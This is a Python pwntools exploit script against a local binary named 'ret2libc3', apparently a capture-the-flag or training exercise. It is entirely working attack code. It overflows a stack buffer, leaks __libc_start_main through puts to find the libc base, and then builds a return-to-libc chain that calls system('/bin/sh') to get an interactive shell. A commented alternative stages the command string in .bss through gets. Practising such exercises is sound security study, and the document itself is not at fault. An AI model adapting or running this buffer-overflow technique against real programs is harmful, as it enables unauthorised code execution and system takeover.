#!/usr/bin/python

from pwn import *
# context.log_level = "debug"

elf_ret2libc3 = ELF('./ret2libc3')
elf_libc = ELF('./libc.so')

sh = process('./ret2libc3')

plt_puts = elf_ret2libc3.plt['puts']
got_libc_start_main = elf_ret2libc3.got['__libc_start_main']
addr_start = elf_ret2libc3.symbols['_start']
offset = 0x6c + 4

payload1 = flat([                       \
                 b'A' * offset,         \
                 plt_puts,              \
                 addr_start,            \
                 got_libc_start_main    \
         ])
sh.sendlineafter('Can you find it !?', payload1)
libc_start_main_addr = u32(sh.recv()[0:4])

libc_base = libc_start_main_addr - elf_libc.symbols['__libc_start_main']

system_addr = libc_base + elf_libc.symbols['system']

# solution 1 : find address of '/bin/sh' in libc.so
addr_bin_sh = libc_base + next(elf_libc.search(b'/bin/sh'))
payload2 = flat([
                 b'A' * offset,         \
                 system_addr,           \
                 0xdeadbeef,            \
                 addr_bin_sh            \
           ])
sh.sendline(payload2)

sh.interactive()

# solution 2 
#       input '/bin/sh' by user
# gets_plt = elf_ret2libc3.plt['gets'] 
# bss_addr = 0x0804a080
# pop_ret_addr = 0x0804841d
# payload = b'A'*offset + p32(gets_plt) + p32(pop_ret_addr) + p32(bss_addr) + p32(system_addr) + p32(addr_start) + p32(bss_addr)
# sh.sendline(payload)
# sh.sendline('/root/test.sh')
# sh.interactive()
